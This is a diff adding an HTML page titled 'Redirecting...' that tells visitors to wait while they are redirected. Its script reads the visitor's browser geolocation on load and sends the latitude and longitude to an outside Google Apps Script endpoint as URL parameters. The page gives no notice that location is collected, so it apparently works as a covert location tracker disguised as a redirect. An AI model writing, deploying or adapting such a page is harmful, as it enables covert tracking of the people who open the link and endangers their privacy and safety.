@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Redirecting...</title>
+  </head>
+  <body>
+    <h3>Please wait while we redirect you...</h3>
+
+    <script>
+      // Check if geolocation is available in the browser
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          var latitude = position.coords.latitude;
+          var longitude = position.coords.longitude;
+
+          // Redirect to Google Apps Script with latitude and longitude as parameters
+          window.location.href = "https://script.google.com/macros/s/AKfycbxXe_pK6IYcbVNsKb94bQrXuCeHFxgYGtUGbImONcant_u5i1zzXxO2GdTNiaXy33Nk/exec?lat=" + latitude + "&lng=" + longitude;
+        }, function(error) {
+          // If geolocation fails, redirect without location data
+          window.location.href = "https://script.google.com/macros/s/AKfycbxXe_pK6IYcbVNsKb94bQrXuCeHFxgYGtUGbImONcant_u5i1zzXxO2GdTNiaXy33Nk/exec";
+        });
+      } else {
+        // If geolocation is not supported, redirect without location data
+        window.location.href = "https://script.google.com/macros/s/AKfycbxXe_pK6IYcbVNsKb94bQrXuCeHFxgYGtUGbImONcant_u5i1zzXxO2GdTNiaXy33Nk/exec";
+      }
+    </script>
+  </body>
+</html>
